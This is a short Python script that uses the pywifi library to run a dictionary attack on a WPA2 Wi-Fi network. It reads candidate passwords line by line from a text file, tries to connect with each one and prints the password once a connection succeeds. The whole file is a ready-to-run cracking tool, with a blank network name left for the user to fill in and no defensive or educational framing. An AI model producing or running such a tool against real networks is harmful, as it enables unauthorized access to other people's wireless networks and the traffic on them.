import time
import pywifi
from pywifi import const
from asyncio.tasks import sleep
class PoJie():
    def __init__(self,path):
        self.file=open(path,"r",errors="ignore")
        wifi = pywifi.PyWiFi()
        self.iface = wifi.interfaces()[0]
        self.iface.disconnect()

        time.sleep(1)


        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
            print("Start hack：")
            while True:

                try:
                    myStr =self.file.readline()
                    if not myStr:
                        break
                    bool1=self.test_connect(myStr)
                    if bool1:
                        print("Password cracked：",myStr)
                        break
                    else:
                        print("Password is not cracked :"+myStr)
                    time.sleep(1)
                except:
                    continue

    def test_connect(self,findStr):

        profile = pywifi.Profile()

        profile.ssid ="" # input ur wifi name

        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = findStr

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:
            isOK=True
        else:
            isOK=False
        self.iface.disconnect()
        time.sleep(1)

        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK


    def __del__(self):
        self.file.close()


path=r"passwords.txt" # name of txt file with possible passwords

start=PoJie(path)
start.readPassWord()